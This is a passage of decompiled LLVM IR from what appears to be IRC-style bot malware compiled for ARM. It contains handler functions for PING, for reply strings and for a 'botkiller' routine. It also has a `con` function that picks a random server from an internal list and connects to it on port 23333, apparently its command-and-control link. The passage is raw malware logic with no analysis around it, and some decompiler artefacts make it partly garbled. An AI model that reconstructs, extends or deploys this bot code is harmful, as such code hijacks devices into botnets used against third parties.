  %v6_95ec = icmp slt i32 %stack_var_-28.022, %stack_var_-32.2
  br i1 %v6_95ec, label %dec_label_pc_9608, label %dec_label_pc_96f8

dec_label_pc_95fc:                                ; preds = %dec_label_pc_9620
  %v1_9600 = add i32 %storemerge17, 1
  br label %dec_label_pc_9608

dec_label_pc_9608:                                ; preds = %dec_label_pc_95d4, %dec_label_pc_95fc
  %storemerge17 = phi i32 [ %v1_9600, %dec_label_pc_95fc ], [ 0, %dec_label_pc_95d4 ]
  store i32 %v1_95d8, i32* %r0.global-to-local, align 4
  %v3_9610 = call i32 @strlen(i8* %v5_95dc)
  store i32 %v3_9610, i32* %r0.global-to-local, align 4
  %v3_9618 = icmp ult i32 %storemerge17, %v3_9610
  br i1 %v3_9618, label %dec_label_pc_9620, label %dec_label_pc_9608.dec_label_pc_963c_crit_edge

dec_label_pc_9608.dec_label_pc_963c_crit_edge:    ; preds = %dec_label_pc_9608
  %.pre30 = add i32 %storemerge17, %v1_95d8
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_963c

dec_label_pc_9620:                                ; preds = %dec_label_pc_9608
  %v2_962c = add i32 %storemerge17, %v1_95d8
  %v1_9630 = inttoptr i32 %v2_962c to i8*
  %v2_9630 = load i8, i8* %v1_9630, align 1
  %v7_9634 = icmp eq i8 %v2_9630, 32
  br i1 %v7_9634, label %dec_label_pc_963c, label %dec_label_pc_95fc

dec_label_pc_963c:                                ; preds = %dec_label_pc_9620, %dec_label_pc_9608.dec_label_pc_963c_crit_edge
  %v5_96e4.pre-phi = phi i8* [ %.pre31, %dec_label_pc_9608.dec_label_pc_963c_crit_edge ], [ %v1_9630, %dec_label_pc_9620 ]
  %v2_96e0.pre-phi = phi i32 [ %.pre30, %dec_label_pc_9608.dec_label_pc_963c_crit_edge ], [ %v2_962c, %dec_label_pc_9620 ]
  store i32 %stack_var_-28.022, i32* @r4, align 4
  %v1_9644 = add i32 %storemerge17, 1
  store i32 %v1_9644, i32* @r0, align 4
  %v0_964c = call i32 @malloc()
  %v0_965c = load i32, i32* @r4, align 4
  %v3_965c = mul i32 %v0_965c, 4
  store i32 %v2_94e0, i32* %r0.global-to-local, align 4
  %v2_9668 = add i32 %v2_95b8, %v3_965c
  %v2_966c = inttoptr i32 %v2_9668 to i32*
  store i32 %v0_964c, i32* %v2_966c, align 4
  %v3_9678 = mul i32 %stack_var_-28.022, 4
  %v2_9684 = add i32 %v2_95b8, %v3_9678
  %v1_9688 = inttoptr i32 %v2_9684 to i32*
  %v2_9688 = load i32, i32* %v1_9688, align 4
  store i32 %storemerge17, i32* @r2, align 4
  store i32 %v2_9688, i32* %r0.global-to-local, align 4
  store i32 %v1_95d8, i32* @r1, align 4
  %v3_9698 = call i32 @strncpy(i32 %v2_9688, i32 %v1_95d8, i32 %storemerge17)
  store i32 %v2_94e0, i32* %r0.global-to-local, align 4
  %v2_96b4 = load i32, i32* %v1_9688, align 4
  %v2_96bc = add i32 %v2_96b4, %storemerge17
  %v3_96c4 = inttoptr i32 %v2_96bc to i8*
  store i8 0, i8* %v3_96c4, align 1
  %v1_96cc = add nuw i32 %stack_var_-28.022, 1
  %v2_96ec = load i8, i8* %v5_96e4.pre-phi, align 1
  %v2_96f0 = icmp eq i8 %v2_96ec, 0
  br i1 %v2_96f0, label %dec_label_pc_96f8, label %dec_label_pc_95d4

dec_label_pc_96f8:                                ; preds = %dec_label_pc_963c, %dec_label_pc_95d4, %dec_label_pc_9594
  %v7_97d8 = load i32, i32* bitcast ([4 x i8]** @global_var_23424.330 to i32*), align 4
  %v2_97dc = icmp eq i32 %v7_97d8, 0
  br i1 %v2_97dc, label %dec_label_pc_97e4, label %dec_label_pc_9704

dec_label_pc_9704:                                ; preds = %dec_label_pc_96f8
  store i32 %v7_97d8, i32* %r0.global-to-local, align 4
  %v2_9724 = inttoptr i32 %v7_97d8 to i8*
  %v3_9724 = call i32 @strcasecmp(i8* %v2_9724, i32 %v2_93cc)
  store i32 %v3_9724, i32* %r0.global-to-local, align 4
  %v2_974c = load i32, i32* inttoptr (i32 add (i32 ptrtoint ([4 x i8]** @global_var_23424.330 to i32), i32 4) to i32*), align 4
  store i32 %v2_974c, i32* @r4, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 38772, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_974c)
  %v5_97bc68 = icmp sgt i32 %stack_var_-32.2, 1
  br i1 %v5_97bc68, label %dec_label_pc_9780, label %dec_label_pc_97e4

dec_label_pc_9780:                                ; preds = %dec_label_pc_9704, %dec_label_pc_9780
  %storemerge1669 = phi i32 [ %v1_97a8, %dec_label_pc_9780 ], [ 1, %dec_label_pc_9704 ]
  store i32 -68, i32* @r2, align 4
  %v3_9788 = mul i32 %storemerge1669, 4
  %v2_9794 = add i32 %v2_95b8, %v3_9788
  %v1_9798 = inttoptr i32 %v2_9794 to i32*
  %v2_9798 = load i32, i32* %v1_9798, align 4
  store i32 %v2_9798, i32* %r0.global-to-local, align 4
  %v1_97a0 = call i32 @free(i32 %v2_9798)
  store i32 %v1_97a0, i32* %r0.global-to-local, align 4
  %v1_97a8 = add nuw nsw i32 %storemerge1669, 1
  %v5_97bc = icmp slt i32 %v1_97a8, %stack_var_-32.2
  br i1 %v5_97bc, label %dec_label_pc_9780, label %dec_label_pc_97e4

dec_label_pc_97e4:                                ; preds = %dec_label_pc_9704, %dec_label_pc_9780, %dec_label_pc_96f8, %dec_label_pc_9440, %dec_label_pc_93a4, %dec_label_pc_937c
  %v1_97ec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_97ec

; uselistorder directives
  uselistorder i32 %v1_97a8, { 1, 0 }
  uselistorder i32 %v7_97d8, { 1, 0, 2 }
  uselistorder i32 %.pre30, { 1, 0 }
  uselistorder i32 %storemerge17, { 1, 3, 2, 4, 6, 5, 0, 7 }
  uselistorder i32 %v1_95d8, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %stack_var_-28.022, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-32.2, { 3, 1, 2, 0 }
  uselistorder i32 %storemerge15, { 2, 0, 1 }
  uselistorder i32 %stack_var_-32.1, { 0, 2, 1 }
  uselistorder i32 %v4_94ac, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge14, { 2, 0, 1 }
  uselistorder i8* %stack_var_-36.0, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v2_94e0, { 2, 1, 0, 4, 3 }
  uselistorder i32 %storemerge13, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_93ec, { 2, 0, 1, 3, 4 }
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge11, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 24, 3, 1, 2, 6, 4, 5, 7, 8, 10, 9, 13, 11, 12, 15, 14, 17, 16, 19, 18, 20, 22, 21, 25, 23, 27, 26, 0 }
  uselistorder i32 -68, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_97e4, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_9780, { 1, 0 }
  uselistorder label %dec_label_pc_9608, { 1, 0 }
  uselistorder label %dec_label_pc_95d4, { 1, 0 }
  uselistorder label %dec_label_pc_9594, { 1, 0 }
  uselistorder label %dec_label_pc_955c, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_9550, { 1, 0 }
  uselistorder label %dec_label_pc_950c, { 1, 0 }
  uselistorder label %dec_label_pc_940c, { 1, 0 }
  uselistorder label %dec_label_pc_9348, { 1, 0 }
  uselistorder label %dec_label_pc_92c4, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 38924, i32* %stack_var_-4, align 4
  %v2_9808 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9808, i32* @fp, align 4
  %v2_9820 = load i32, i32* @global_var_23e64.326, align 4
  %v4_9830 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_19b40.333 to i32), i32 %v2_9820)
  %v2_9838 = load i32, i32* @global_var_23e7c.313, align 4
  %v4_984c = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_19b50.338 to i32), i32 %v2_9838)
  %v2_9854 = load i32, i32* @global_var_23e64.326, align 4
  %v4_9864 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_19b60.340 to i32), i32 %v2_9854)
  ret i32 %v4_9864

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 39064, i32* %stack_var_-4, align 4
  %v2_9894 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9894, i32* @fp, align 4
  %v4_98b4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_19b68.342 to i32), i32 %arg3)
  ret i32 %v4_98b4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  store i32 39124, i32* %stack_var_-4, align 4
  %v2_98d0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_98d0, i32* @fp, align 4
  br label %dec_label_pc_9918.preheader

dec_label_pc_9900:                                ; preds = %dec_label_pc_9930
  %v1_9904 = add i32 %.pre, 1
  %v5_9908 = inttoptr i32 %v1_9904 to i8*
  %v1_9910 = add i32 %stack_var_-40.0, 1
  br label %dec_label_pc_9918

dec_label_pc_9918:                                ; preds = %dec_label_pc_9918.preheader, %dec_label_pc_9900
  %stack_var_-40.0 = phi i32 [ %v1_9910, %dec_label_pc_9900 ], [ %stack_var_-40.117, %dec_label_pc_9918.preheader ]
  %stack_var_-32.0 = phi i8* [ %v5_9908, %dec_label_pc_9900 ], [ %stack_var_-32.118, %dec_label_pc_9918.preheader ]
  %v3_9920 = call i32 @strlen(i8* %arg3)
  %v3_9928 = icmp ult i32 %stack_var_-40.0, %v3_9920
  %.pre = ptrtoint i8* %stack_var_-32.0 to i32
  br i1 %v3_9928, label %dec_label_pc_9930, label %dec_label_pc_9940

dec_label_pc_9930:                                ; preds = %dec_label_pc_9918
  %v2_9934 = load i8, i8* %stack_var_-32.0, align 1
  %v7_9938 = icmp eq i8 %v2_9934, 32
  br i1 %v7_9938, label %dec_label_pc_9940, label %dec_label_pc_9900

dec_label_pc_9940:                                ; preds = %dec_label_pc_9918, %dec_label_pc_9930
  %v1_9944 = add i32 %.pre, 1
  %v3_9954 = call i32 @strlen(i8* %arg3)
  %v9_995c = icmp eq i32 %stack_var_-40.0, %v3_9954
  br i1 %v9_995c, label %dec_label_pc_9bc4, label %dec_label_pc_9964

dec_label_pc_9964:                                ; preds = %dec_label_pc_9940
  %v5_9948 = inttoptr i32 %v1_9944 to i8*
  %v1_9968 = add nuw nsw i32 %storemerge719, 1
  %v7_9978 = icmp slt i32 %v1_9968, 5
  br i1 %v7_9978, label %dec_label_pc_9918.preheader, label %dec_label_pc_9994

dec_label_pc_9918.preheader:                      ; preds = %entry, %dec_label_pc_9964
  %storemerge719 = phi i32 [ 0, %entry ], [ %v1_9968, %dec_label_pc_9964 ]
  %stack_var_-32.118 = phi i8* [ %arg3, %entry ], [ %v5_9948, %dec_label_pc_9964 ]
  %stack_var_-40.117 = phi i32 [ 0, %entry ], [ %stack_var_-40.0, %dec_label_pc_9964 ]
  br label %dec_label_pc_9918

dec_label_pc_9988:                                ; preds = %dec_label_pc_99ac
  %v1_998c = add i32 %storemerge8, 1
  br label %dec_label_pc_9994

dec_label_pc_9994:                                ; preds = %dec_label_pc_9964, %dec_label_pc_9988
  %storemerge8 = phi i32 [ %v1_998c, %dec_label_pc_9988 ], [ 0, %dec_label_pc_9964 ]
  store i32 %storemerge8, i32* @r4, align 4
  %v3_999c = call i32 @strlen(i8* %v5_9948)
  %v0_99a4 = load i32, i32* @r4, align 4
  %v3_99a4 = icmp ult i32 %v0_99a4, %v3_999c
  br i1 %v3_99a4, label %dec_label_pc_99ac, label %dec_label_pc_9994.dec_label_pc_99c8_crit_edge

dec_label_pc_9994.dec_label_pc_99c8_crit_edge:    ; preds = %dec_label_pc_9994
  %.pre25 = add i32 %storemerge8, %v1_9944
  %.pre26 = inttoptr i32 %.pre25 to i8*
  br label %dec_label_pc_99c8

dec_label_pc_99ac:                                ; preds = %dec_label_pc_9994
  %v2_99b8 = add i32 %storemerge8, %v1_9944
  %v1_99bc = inttoptr i32 %v2_99b8 to i8*
  %v2_99bc = load i8, i8* %v1_99bc, align 1
  %v7_99c0 = icmp eq i8 %v2_99bc, 32
  br i1 %v7_99c0, label %dec_label_pc_99c8, label %dec_label_pc_9988

dec_label_pc_99c8:                                ; preds = %dec_label_pc_99ac, %dec_label_pc_9994.dec_label_pc_99c8_crit_edge
  %v3_99dc.pre-phi = phi i8* [ %.pre26, %dec_label_pc_9994.dec_label_pc_99c8_crit_edge ], [ %v1_99bc, %dec_label_pc_99ac ]
  store i8 0, i8* %v3_99dc.pre-phi, align 1
  %v2_99e4 = load i32, i32* @global_var_23e64.326, align 4
  %v4_99f0 = call i32 @strcasecmp(i8* %v5_9948, i32 %v2_99e4)
  %v2_99f8 = icmp eq i32 %v4_99f0, 0
  br i1 %v2_99f8, label %dec_label_pc_9a00, label %dec_label_pc_9bc4

dec_label_pc_9a00:                                ; preds = %dec_label_pc_99c8
  %v2_9a04 = load i32, i32* @global_var_234b8.345, align 4
  %v2_9a08 = icmp eq i32 %v2_9a04, 0
  br i1 %v2_9a08, label %dec_label_pc_9a10, label %dec_label_pc_9bc4

dec_label_pc_9a10:                                ; preds = %dec_label_pc_9a00
  br label %dec_label_pc_9a44.preheader

dec_label_pc_9a2c:                                ; preds = %dec_label_pc_9a5c
  %v1_9a30 = add i32 %.pre27, 1
  %v5_9a34 = inttoptr i32 %v1_9a30 to i8*
  %v1_9a3c = add i32 %stack_var_-40.2, 1
  br label %dec_label_pc_9a44

dec_label_pc_9a44:                                ; preds = %dec_label_pc_9a44.preheader, %dec_label_pc_9a2c
  %stack_var_-40.2 = phi i32 [ %v1_9a3c, %dec_label_pc_9a2c ], [ %stack_var_-40.314, %dec_label_pc_9a44.preheader ]
  %stack_var_-32.2 = phi i8* [ %v5_9a34, %dec_label_pc_9a2c ], [ %stack_var_-32.315, %dec_label_pc_9a44.preheader ]
  %v3_9a4c = call i32 @strlen(i8* %arg3)
  %v3_9a54 = icmp ult i32 %stack_var_-40.2, %v3_9a4c
  %.pre27 = ptrtoint i8* %stack_var_-32.2 to i32
  br i1 %v3_9a54, label %dec_label_pc_9a5c, label %dec_label_pc_9a6c

dec_label_pc_9a5c:                                ; preds = %dec_label_pc_9a44
  %v2_9a60 = load i8, i8* %stack_var_-32.2, align 1
  %v7_9a64 = icmp eq i8 %v2_9a60, 32
  br i1 %v7_9a64, label %dec_label_pc_9a6c, label %dec_label_pc_9a2c

dec_label_pc_9a6c:                                ; preds = %dec_label_pc_9a44, %dec_label_pc_9a5c
  %v1_9a70 = add i32 %.pre27, 1
  %v3_9a80 = call i32 @strlen(i8* %arg3)
  %v9_9a88 = icmp eq i32 %stack_var_-40.2, %v3_9a80
  br i1 %v9_9a88, label %dec_label_pc_9bc4, label %dec_label_pc_9a90

dec_label_pc_9a90:                                ; preds = %dec_label_pc_9a6c
  %v5_9a74 = inttoptr i32 %v1_9a70 to i8*
  %v1_9a94 = add nuw nsw i32 %storemerge916, 1
  %v7_9aa4 = icmp slt i32 %v1_9a94, 3
  br i1 %v7_9aa4, label %dec_label_pc_9a44.preheader, label %dec_label_pc_9ac0

dec_label_pc_9a44.preheader:                      ; preds = %dec_label_pc_9a10, %dec_label_pc_9a90
  %storemerge916 = phi i32 [ 0, %dec_label_pc_9a10 ], [ %v1_9a94, %dec_label_pc_9a90 ]
  %stack_var_-32.315 = phi i8* [ %arg3, %dec_label_pc_9a10 ], [ %v5_9a74, %dec_label_pc_9a90 ]
  %stack_var_-40.314 = phi i32 [ 0, %dec_label_pc_9a10 ], [ %stack_var_-40.2, %dec_label_pc_9a90 ]
  br label %dec_label_pc_9a44

dec_label_pc_9ab4:                                ; preds = %dec_label_pc_9ad8
  %v1_9ab8 = add i32 %storemerge10, 1
  br label %dec_label_pc_9ac0

dec_label_pc_9ac0:                                ; preds = %dec_label_pc_9a90, %dec_label_pc_9ab4
  %storemerge10 = phi i32 [ %v1_9ab8, %dec_label_pc_9ab4 ], [ 0, %dec_label_pc_9a90 ]
  store i32 %storemerge10, i32* @r4, align 4
  %v3_9ac8 = call i32 @strlen(i8* %v5_9a74)
  %v0_9ad0 = load i32, i32* @r4, align 4
  %v3_9ad0 = icmp ult i32 %v0_9ad0, %v3_9ac8
  br i1 %v3_9ad0, label %dec_label_pc_9ad8, label %dec_label_pc_9ac0.dec_label_pc_9af4_crit_edge

dec_label_pc_9ac0.dec_label_pc_9af4_crit_edge:    ; preds = %dec_label_pc_9ac0
  %.pre28 = add i32 %storemerge10, %v1_9a70
  %.pre29 = inttoptr i32 %.pre28 to i8*
  br label %dec_label_pc_9af4

dec_label_pc_9ad8:                                ; preds = %dec_label_pc_9ac0
  %v2_9ae4 = add i32 %storemerge10, %v1_9a70
  %v1_9ae8 = inttoptr i32 %v2_9ae4 to i8*
  %v2_9ae8 = load i8, i8* %v1_9ae8, align 1
  %v7_9aec = icmp eq i8 %v2_9ae8, 32
  br i1 %v7_9aec, label %dec_label_pc_9af4, label %dec_label_pc_9ab4

dec_label_pc_9af4:                                ; preds = %dec_label_pc_9ad8, %dec_label_pc_9ac0.dec_label_pc_9af4_crit_edge
  %v3_9b08.pre-phi = phi i8* [ %.pre29, %dec_label_pc_9ac0.dec_label_pc_9af4_crit_edge ], [ %v1_9ae8, %dec_label_pc_9ad8 ]
  store i8 0, i8* %v3_9b08.pre-phi, align 1
  store i32 %v1_9a70, i32* @r0, align 4
  %v2_9b10 = call i32 @inet_addr(i32 %v1_9a70)
  %v5_9b18 = trunc i32 %v2_9b10 to i8
  store i8 %v5_9b18, i8* %stack_var_-44, align 1
  %v3_9b20 = icmp eq i8 %v5_9b18, -1
  br i1 %v3_9b20, label %dec_label_pc_9b28, label %dec_label_pc_9b68

dec_label_pc_9b28:                                ; preds = %dec_label_pc_9af4
  store i32 %v1_9a70, i32* @r0, align 4
  %v2_9b2c = call i32 @gethostbyname(i32 %v1_9a70)
  %v2_9b3c = icmp eq i32 %v2_9b2c, 0
  br i1 %v2_9b3c, label %dec_label_pc_9bc4, label %dec_label_pc_9b44

dec_label_pc_9b44:                                ; preds = %dec_label_pc_9b28
  %v1_9b48 = add i32 %v2_9b2c, 16
  %v2_9b48 = inttoptr i32 %v1_9b48 to i32*
  %v3_9b48 = load i32, i32* %v2_9b48, align 4
  %v1_9b4c = inttoptr i32 %v3_9b48 to i32*
  %v2_9b4c = load i32, i32* %v1_9b4c, align 4
  %v1_9b54 = add i32 %v2_9b2c, 12
  %v2_9b54 = inttoptr i32 %v1_9b54 to i32*
  %v3_9b54 = load i32, i32* %v2_9b54, align 4
  %v2_9b5c = ptrtoint i8* %stack_var_-44 to i32
  store i32 %v2_9b5c, i32* @r3, align 4
  %v3_9b64 = bitcast i8* %stack_var_-44 to i16*
  %v4_9b64 = call i32 @memcpy(i16* %v3_9b64, i32 %v2_9b4c, i32 %v3_9b54)
  %v2_9b74.pre = load i8, i8* %stack_var_-44, align 1
  br label %dec_label_pc_9b68

dec_label_pc_9b68:                                ; preds = %dec_label_pc_9af4, %dec_label_pc_9b44
  %v1_9bcc24 = phi i32 [ %v4_9b64, %dec_label_pc_9b44 ], [ %v2_9b10, %dec_label_pc_9af4 ]
  %v2_9b74 = phi i8 [ %v2_9b74.pre, %dec_label_pc_9b44 ], [ %v5_9b18, %dec_label_pc_9af4 ]
  store i8 %v2_9b74, i8* bitcast (i8** @global_var_234b7.348 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_234b4.347 to i8*), align 4
  store i32 256, i32* @global_var_234b8.345, align 4
  br label %dec_label_pc_9bc4

dec_label_pc_9bc4:                                ; preds = %dec_label_pc_9940, %dec_label_pc_9a6c, %dec_label_pc_9a00, %dec_label_pc_99c8, %dec_label_pc_9b28, %dec_label_pc_9b68
  %v1_9bcc = phi i32 [ 0, %dec_label_pc_9a00 ], [ %v4_99f0, %dec_label_pc_99c8 ], [ 0, %dec_label_pc_9b28 ], [ %v1_9bcc24, %dec_label_pc_9b68 ], [ %v3_9a80, %dec_label_pc_9a6c ], [ %v3_9954, %dec_label_pc_9940 ]
  ret i32 %v1_9bcc

; uselistorder directives
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v1_9a94, { 1, 0 }
  uselistorder i32 %v1_9a70, { 3, 2, 5, 4, 0, 1, 6 }
  uselistorder i8* %stack_var_-32.2, { 1, 0 }
  uselistorder i32 %stack_var_-40.2, { 2, 0, 1, 3 }
  uselistorder i32 %storemerge8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_9968, { 1, 0 }
  uselistorder i8* %stack_var_-32.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %arg3, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_9bc4, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_9b68, { 1, 0 }
  uselistorder label %dec_label_pc_9ac0, { 1, 0 }
  uselistorder label %dec_label_pc_9a44.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_9a6c, { 1, 0 }
  uselistorder label %dec_label_pc_9994, { 1, 0 }
  uselistorder label %dec_label_pc_9918.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_9940, { 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r2, align 4
  %stack_var_-74 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 39912, i32* %stack_var_-4, align 4
  %v2_9be4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9be4, i32* @fp, align 4
  %v2_9bfc = load i32, i32* @global_var_23e64.326, align 4
  %v1_9c04 = call i32 @free(i32 %v2_9bfc)
  %v1_9c10 = call i32 @makestring(i32 %v1_9c04)
  %v2_9c1c = ptrtoint i32* %stack_var_-74 to i32
  store i32 ptrtoint ([17 x i8]* @global_var_19b74.353 to i32), i32* @r1, align 4
  %v3_9c28 = call i32 @strcpy(i32 %v2_9c1c, i32 ptrtoint ([17 x i8]* @global_var_19b74.353 to i32))
  %v2_9c38 = bitcast i32* %stack_var_-74 to i8*
  %v3_9c38 = call i32 @strcat(i8* %v2_9c38, i32 %v1_9c10)
  store i32 %v2_9c1c, i32* @global_var_23e64.326, align 4
  %v1_9c48 = call i32 @botkiller(i32 %v3_9c38)
  ret i32 %v1_9c48

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9c64 = load i32, i32* @fp, align 4
  store i32 40044, i32* %stack_var_-4, align 4
  %v2_9c68 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c68, i32* @fp, align 4
  %v2_9d98 = ptrtoint i32* %stack_var_-40 to i32
  %v2_9de8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_9e28 = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_9c70

dec_label_pc_9c70:                                ; preds = %dec_label_pc_9c70.backedge, %entry
  store i32 -1, i32* @global_var_23e68.355, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v2_9c88 = load i32, i32* @global_var_234ac.357, align 4
  %v2_9c8c = icmp eq i32 %v2_9c88, 0
  br i1 %v2_9c8c, label %dec_label_pc_9c94, label %dec_label_pc_9cc8

dec_label_pc_9c94:                                ; preds = %dec_label_pc_9c70
  %v0_9c94 = call i32 @rand()
  %v2_9ca0 = load i32, i32* @global_var_23414.359, align 4
  %v3_9cac = urem i32 %v0_9c94, %v2_9ca0
  %v4_9cbc = mul i32 %v3_9cac, 4
  %v5_9cbc = add i32 %v4_9cbc, ptrtoint ([22 x i8]** @global_var_23418.362 to i32)
  %v6_9cbc = inttoptr i32 %v5_9cbc to i32*
  %v7_9cbc = load i32, i32* %v6_9cbc, align 4
  store i32 %v7_9cbc, i32* @global_var_23e70.364, align 4
  br label %dec_label_pc_9cc8

dec_label_pc_9cc8:                                ; preds = %dec_label_pc_9c70, %dec_label_pc_9c94
  store i32 0, i32* @global_var_234ac.357, align 4
  br label %dec_label_pc_9cd4

dec_label_pc_9cd4:                                ; preds = %dec_label_pc_9cd4, %dec_label_pc_9cc8
  %v3_9ce0 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_9ce0, i32* @global_var_23e68.355, align 4
  %v1_9cf8 = icmp slt i32 %v3_9ce0, 0
  br i1 %v1_9cf8, label %dec_label_pc_9cd4, label %dec_label_pc_9d00

dec_label_pc_9d00:                                ; preds = %dec_label_pc_9cd4
  %v2_9d04 = load i32, i32* @global_var_23e70.364, align 4
  store i32 %v2_9d04, i32* @r0, align 4
  %v1_9d0c = call i32 @inet_addr(i32 %v2_9d04)
  %v2_9d14 = icmp eq i32 %v1_9d0c, 0
  br i1 %v2_9d14, label %dec_label_pc_9d38, label %dec_label_pc_9d1c

dec_label_pc_9d1c:                                ; preds = %dec_label_pc_9d00
  %v2_9d20 = load i32, i32* @global_var_23e70.364, align 4
  store i32 %v2_9d20, i32* @r0, align 4
  %v1_9d28 = call i32 @inet_addr(i32 %v2_9d20)
  %v3_9d30 = icmp eq i32 %v1_9d28, -1
  br i1 %v3_9d30, label %dec_label_pc_9d38, label %dec_label_pc_9dac

dec_label_pc_9d38:                                ; preds = %dec_label_pc_9d1c, %dec_label_pc_9d00
  %v2_9d3c = load i32, i32* @global_var_23e70.364, align 4
  store i32 %v2_9d3c, i32* @r0, align 4
  %v1_9d44 = call i32 @gethostbyname(i32 %v2_9d3c)
  %v2_9d54 = icmp eq i32 %v1_9d44, 0
  br i1 %v2_9d54, label %dec_label_pc_9d5c, label %dec_label_pc_9d7c

dec_label_pc_9d5c:                                ; preds = %dec_label_pc_9d38
  store i32 0, i32* @global_var_23e70.364, align 4
  %v2_9d6c = load i32, i32* @global_var_23e68.355, align 4
  %v1_9d74 = call i32 @close(i32 %v2_9d6c)
  br label %dec_label_pc_9c70.backedge

dec_label_pc_9c70.backedge:                       ; preds = %dec_label_pc_9d5c, %dec_label_pc_9f1c
  br label %dec_label_pc_9c70

dec_label_pc_9d7c:                                ; preds = %dec_label_pc_9d38
  %v1_9d80 = add i32 %v1_9d44, 16
  %v2_9d80 = inttoptr i32 %v1_9d80 to i32*
  %v3_9d80 = load i32, i32* %v2_9d80, align 4
  %v1_9d84 = inttoptr i32 %v3_9d80 to i32*
  %v2_9d84 = load i32, i32* %v1_9d84, align 4
  %v1_9d8c = add i32 %v1_9d44, 12
  %v2_9d8c = inttoptr i32 %v1_9d8c to i32*
  %v3_9d8c = load i32, i32* %v2_9d8c, align 4
  store i32 %v3_9d8c, i32* @r2, align 4
  %v3_9da4 = call i32 @bcopy(i32 %v2_9d84, i32 %v2_9d98, i32 %v3_9d8c)
  br label %dec_label_pc_9dc4

dec_label_pc_9dac:                                ; preds = %dec_label_pc_9d1c
  %v2_9db0 = load i32, i32* @global_var_23e70.364, align 4
  store i32 %v2_9db0, i32* @r0, align 4
  %v1_9db8 = call i32 @inet_addr(i32 %v2_9db0)
  store i32 %v1_9db8, i32* %stack_var_-40, align 4
  br label %dec_label_pc_9dc4

dec_label_pc_9dc4:                                ; preds = %dec_label_pc_9d7c, %dec_label_pc_9dac
  store i32 2, i32* %stack_var_-44, align 4
  %v1_9dd4 = call i32 @htons(i32 23333)
  %v2_9de4 = load i32, i32* @global_var_23e68.355, align 4
  store i32 %v2_9de4, i32* @r0, align 4
  %v3_9df8 = call i32 @ioctl(i32 %v2_9de4, i32 21537, i32 %v2_9de8)
  %v2_9e00 = call i32 @time(i32* null)
  br label %dec_label_pc_9efc

dec_label_pc_9e10:                                ; preds = %dec_label_pc_9efc
  %v0_9e10 = call i32 @__errno_location()
  %v2_9e1c = inttoptr i32 %v0_9e10 to i32*
  store i32 0, i32* %v2_9e1c, align 4
  %v2_9e24 = load i32, i32* @global_var_23e68.355, align 4
  %v3_9e38 = call i32 @connect(i32 %v2_9e24, i32 %v2_9e28, i32 16)
  %v2_9e40 = icmp eq i32 %v3_9e38, 0
  br i1 %v2_9e40, label %dec_label_pc_9e5c, label %dec_label_pc_9e48

dec_label_pc_9e48:                                ; preds = %dec_label_pc_9e10
  %v0_9e48 = call i32 @__errno_location()
  %v1_9e50 = inttoptr i32 %v0_9e48 to i32*
  %v2_9e50 = load i32, i32* %v1_9e50, align 4
  %v7_9e54 = icmp eq i32 %v2_9e50, 106
  br i1 %v7_9e54, label %dec_label_pc_9e5c, label %dec_label_pc_9ecc

